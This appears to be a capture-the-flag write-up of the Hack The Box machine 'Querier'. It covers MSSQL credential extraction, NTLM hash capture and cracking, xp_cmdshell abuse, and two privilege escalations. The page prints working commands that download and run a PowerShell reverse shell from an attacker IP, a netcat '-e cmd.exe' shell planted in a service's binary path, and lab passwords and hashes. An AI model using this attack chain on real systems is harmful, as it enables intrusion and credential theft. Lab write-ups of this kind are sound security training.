@@ -1,0 +1,451 @@
+---
+layout: default
+title: Querier
+---
+
+<h1>Querier</h1>
+<p class="date">22/06/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/querier/querier.png">
+
+<p>Querier is a very interesting box which focus on <code>MSSQL</code> exploitation to obtain the user flag and then, we have two ways to escalate privileges, one is to obtain Group Policy passwords and the other is by abusing Windows services.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+    <a class="link-box" href="#altern-privesc">Alternative Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First run <code>nmap</code> to see we have a bunch of ports open, looks like a Windows system with <code>SMB</code> and a <code>MSSQL</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/querier# nmap -sC -sV 10.10.10.125
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 08:54 UTC
+Nmap scan report for 10.10.10.125
+Host is up (0.19s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE       VERSION
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server  14.00.1000.00
+| ms-sql-ntlm-info: 
+|   Target_Name: HTB
+|   NetBIOS_Domain_Name: HTB
+|   NetBIOS_Computer_Name: QUERIER
+|   DNS_Domain_Name: HTB.LOCAL
+|   DNS_Computer_Name: QUERIER.HTB.LOCAL
+|   DNS_Tree_Name: HTB.LOCAL
+|_  Product_Version: 10.0.17763
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2019-02-25T06:31:31
+|_Not valid after:  2049-02-25T06:31:31
+|_ssl-date: 2019-02-25T08:54:57+00:00; -1s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| ms-sql-info: 
+|   10.10.10.125:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 
+|_    TCP port: 1433
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2019-02-25 08:54:59
+|_  start_date: N/A
+</pre>
+
+<p>After running thousands of tools to enumerate SMB I only found something using <code>smbclient</code> where we can see some available shares.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/querier# smbclient -L //10.10.10.125/
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	Reports         Disk      
+Reconnecting with SMB1 for workgroup listing.
+Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available 
+</pre>
+
+<p>If we connect to <code>Reports</code> share we see a <code>xlsm</code> file we can download.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/querier# smbclient //10.10.10.125/Reports
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Jan 28 23:23:48 2019
+  ..                                  D        0  Mon Jan 28 23:23:48 2019
+  Currency Volume Report.xlsm         A    12229  Sun Jan 27 22:21:34 2019
+smb: \> get "Currency Volume Report.xlsm"
+getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (8.3 KiloBytes/sec) (average 8.3 KiloBytes/sec)
+</pre>
+
+<p>If we open this file with LibreOffice for example, we will see the following warning.</p>
+
+<img class="img-fluid" src="/static/img/htb/querier/1.png">
+
+<p>We can see those macros in <code>Tools -> Macros -> Edit Macros</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/querier/2.png">
+
+<p>There we have the this macro which connects to the <code>MSSQL</code> and has its credentials.</p>
+
+<pre class="prettyprint">
+Rem Attribute VBA_ModuleType=VBADocumentModule
+Option VBASupport 1
+
+' macro to pull data for client volume reports
+'
+' further testing required
+
+Private Sub Connect()
+
+Dim conn As ADODB.Connection
+Dim rs As ADODB.Recordset
+
+Set conn = New ADODB.Connection
+conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
+conn.ConnectionTimeout = 10
+conn.Open
+
+If conn.State = adStateOpen Then
+
+  ' MsgBox "connection successful"
+ 
+  'Set rs = conn.Execute("SELECT * @@version;")
+  Set rs = conn.Execute("SELECT * FROM volume;")
+  Sheets(1).Range("A1").CopyFromRecordset rs
+  rs.Close
+
+End If
+
+End Sub
+</pre>
+
+<p>We can use <code>impacket</code> <code>mssqlclient</code> module to connect to that <code>MSSQL</code>. Note that we have to escape the <code>$</code> character.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/querier# /opt/impacket/examples/mssqlclient.py -windows-auth reporting:PcwTWTHRwryjc\$c6@10.10.10.125
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL> 
+</pre>
+
+<p>Looks like we don't have the right permissions to execute commands with <code>xp_cmdshell</code>.</p>
+
+<pre class="prettyprint">
+SQL> EXEC xp_cmdshell 'whoami';
+[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
+</pre>
+
+<p>So we're going to try to connect to a local <code>SMB</code> share to obtain the <code>NTLM</code> hash of the user who runs the MSSQL service, as we did in <a href="giddy" target="_blank">Giddy</a>.</p>
+
+<p>This time we're using <code>responder</code> to intercept the <code>NTLM</code> hash.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/querier# responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 2.3.3.9
+...	
+[+] Listening for events...
+</pre>
+
+<p>Run <code>xp_dirtree</code> to connect to our machine.</p>
+
+<pre class="prettyprint">
+SQL> EXEC master.dbo.xp_dirtree '\\10.10.16.38\caca';
+</pre>
+
+<p>And we'll see how <code>QUERIER\mssql-svc</code> tries to authenticate against us, sending its <code>NTLM</code> hash.</p>
+
+<pre class="prettyprint">
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
+[SMBv2] NTLMv2-SSP Username : QUERIER\mssql-svc
+[SMBv2] NTLMv2-SSP Hash     : mssql-svc::QUERIER:456a5cd73d2ee892:938968049CF1697ABC23ED53C0489952:0101000000000000C0653150DE09D201CCE66ED9DAD95E6F000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000038FDDE5BE6285C5A5B2884FE5FB802D7E7A4294ADBEFE1AA9FB27B3E348D99CF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0033003800000000000000000000000000
+[SMBv2] NTLMv2-SSP Client   : 10.10.10.125
+[SMBv2] NTLMv2-SSP Username : \gX
+[SMBv2] NTLMv2-SSP Hash     : gX:::5cc6ad319396c7dc::
+</pre>
+
+<p>Use <code>hashcat</code> to get the password (<code>corporate568</code>).</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/querier# hashcat -m 5600 ntlm /usr/share/wordlists/rockyou.txt --force
+hashcat (v5.1.0) starting...
+...
+MSSQL-SVC::QUERIER:456a5cd73d2ee892:938968049cf1697abc23ed53c0489952:0101000000000000c0653150de09d201cce66ed9dad95e6f000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d2010600040002000000080030003000000000000000000000000030000038fdde5be6285c5a5b2884fe5fb802d7e7a4294adbefe1aa9fb27b3e348d99cf0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0033003800000000000000000000000000:corporate568
+</pre>
+
+<p>Now we can connect to <code>MSSQL</code> as <code>mssql-svc</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/querier# /opt/impacket/examples/mssqlclient.py -windows-auth mssql-svc:corporate568@10.10.10.125
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL> 
+</pre>
+
+<p>With this user, if we try to run a command with <code>xp_cmdshell</code> we should see the following error meaning its not yet activated.</p>
+
+<pre class="prettyprint">
+SQL> EXEC xp_cmdshell 'whoami'
+[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+</pre>
+
+<p>Run the following configuration to enable it.</p>
+
+<pre class="prettyprint">
+SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+</pre>
+
+<p>Now we have command execution on querier!</p>
+
+<pre class="prettyprint">
+SQL> EXEC xp_cmdshell 'whoami'
+output                                                                                                                                                                                                                                                           
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  
+
+querier\mssql-svc                                                                                                                                                                                                                                                
+NULL  
+</pre>
+
+<p>We're going to try to get a reverse shell through PowerShell.</p>
+
+<p>I used the <a href="https://github.com/samratashok/nishang">Nishang Invoke-PowerShellTcp.ps1 shell</a> adding the following line at the end to run it.</p> 
+
+<pre class="prettyprint">
+Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.38 -Port 6969
+</pre>
+
+<p>First, also use PowerShell to download the file from our machine and put it on <code>mssql-svc</code> desktop.</p>
+
+<pre class="prettyprint">
+SQL> EXEC xp_cmdshell 'powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.16.38/Invoke-PowerShellTcp.ps1\",\"C:\Users\mssql-svc\Desktop\caca.ps1\")"'
+</pre>
+
+<p>If we were serving it with <code>SimpleHTTPServer</code>, we will see a request to retrieve the ps1 file.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/querier# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.125 - - [25/Feb/2019 16:55:28] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+</pre>
+
+<p>Now run that file.</p>
+
+<pre class="prettyprint">
+SQL> EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -File C:\Users\mssql-svc\Desktop\caca.ps1'
+</pre>
+
+<p>If we were listening on the specified port we will get a PS reverse shell as <code>mssql-svc</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/querier# nc -nlvp 6969
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 10.10.10.125.
+Ncat: Connection from 10.10.10.125:49699.
+Windows PowerShell running as user mssql-svc on QUERIER
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32>whoami
+querier\mssql-svc
+</pre>
+
+<p>The user flag is in the user desktop.</p>
+
+<pre class="prettyprint">
+PS C:\Users\mssql-svc\Desktop> type user.txt
+<span flag="c37b41bb669da345bb14de50faab3c16">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>To escalate privileges we will use <a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank">PowerSploit</a> <code>PowerUp</code> privesc script.</p>
+
+<p>Download the file from our machine.</p>
+
+<pre class="prettyprint">
+PS C:\Windows\system32> IEX(New-Object Net.Webclient).downloadString('http://10.10.16.38/PowerUp.ps1')
+</pre>
+
+<p>Run <code>Invoke-AllChecks</code> to search for escalation vectors and we will see the Administrator credentials are cached in a <code>Groups.xml</code> file.</p> 
+
+<pre class="prettyprint">
+PS C:\Windows\system32> Invoke-AllChecks
+...
+[*] Checking for cached Group Policy Preferences .xml files....
+
+
+Changed   : {2019-01-28 23:12:48}
+UserNames : {Administrator}
+NewName   : [BLANK]
+Passwords : {MyUnclesAreMarioAndLuigi!!1!}
+File      : C:\ProgramData\Microsoft\Group 
+            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
+...
+</pre>
+
+<p>We can use <code>psexec</code> to get a shell with those credentials as <code>nt authority\system</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/querier# /opt/impacket/examples/psexec.py Administrator@10.10.10.125
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+Password: MyUnclesAreMarioAndLuigi!!1!
+[*] Requesting shares on 10.10.10.125.....
+[*] Found writable share ADMIN$
+[*] Uploading file PMbHsVpM.exe
+[*] Opening SVCManager on 10.10.10.125.....
+[*] Creating service tNRH on 10.10.10.125.....
+[*] Starting service tNRH.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.292]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+</pre>
+
+<pre class="prettyprint">
+C:\Users\Administrator\Desktop>type root.txt
+<span flag="b19c3794f786a1fdcf205f81497c3592">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="altern-privesc">Alternative Privilege Escalation</h2>
+
+<p>There's another way to escalate privileges in querier, abusing writable services.</p> 
+<p>In the <code>Invoke-AllChecks</code> output we could also see we have permissions to write in <code>UsoSvc</code> service.</p>
+
+<pre class="prettyprint">
+PS C:\Windows\system32> Invoke-AllChecks
+...
+[*] Checking service permissions...
+
+
+ServiceName   : UsoSvc
+Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+CanRestart    : True
+...
+</pre>
+
+<p>What we're doing here is modify the service binary path to execute whatever we want as a privileged user when it starts running.</p>
+
+<p>We could use <code>Invoke-ServiceAbuse</code> also from <code>PowerUp</code> to do this but we're going to do it manually to see how it works.</p> 
+
+<p>This is our vulnerable service.</p>
+
+<pre class="prettyprint">
+PS C:\Windows\system32> sc.exe qc UsoSvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: UsoSvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+</pre>
+
+<p>We're going to run a reverse shell with <code>nc</code>, so to do this we first need to get <code>nc.exe</code>.
+<pre class="prettyprint">
+PS C:\Windows\system32> (New-Object System.Net.WebClient).DownloadFile("http://10.10.16.38/nc.exe","C:\Users\mssql-svc\Desktop\nc.exe")
+</pre>
+
+<p>Note: use the windows official binary (<code>md5:e0fb946c00b140693e3cf5de258c22a1</code>), because if not windows defender blocks it.</p>
+
+<p>Stop <code>UsoSvc</code> service.</p>
+
+<pre class="prettyprint">
+PS C:\Windows\system32> sc.exe stop UsoSvc
+</pre>
+
+<p>Modify the binary path to make it run a reverse shell to our machine with the downloaded <code>nc.exe</code>.</p>
+
+<pre class="prettyprint">
+PS C:\Windows\system32> sc.exe config UsoSvc binpath= "C:\Users\mssql-svc\Desktop\nc.exe 10.10.16.38 6868 -e cmd.exe"
+</pre>
+
+<p>Inspecting the service we can see how the binary path changed correctly.</p>
+
+<pre class="prettyprint">
+PS C:\Windows\system32> sc.exe qc usosvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: usosvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Users\mssql-svc\Desktop\nc.exe 10.10.16.38 6868 -e cmd.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+</pre>
+
+<p>Start the service again.</p>
+
+<pre class="prettyprint">
+PS C:\Windows\system32> sc.exe start UsoSvc
+</pre>
+
+<p>We should receive a shell as <code>nt authority\system</code> that lasts very little because the service dies in few seconds, so we should migrate it to maintain it, but this is enough for this machine.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/querier# nc -nlvp 6868
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6868
+Ncat: Listening on 0.0.0.0:6868
+Ncat: Connection from 10.10.10.125.
+Ncat: Connection from 10.10.10.125:49687.
+Microsoft Windows [Version 10.0.17763.292]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+</pre>
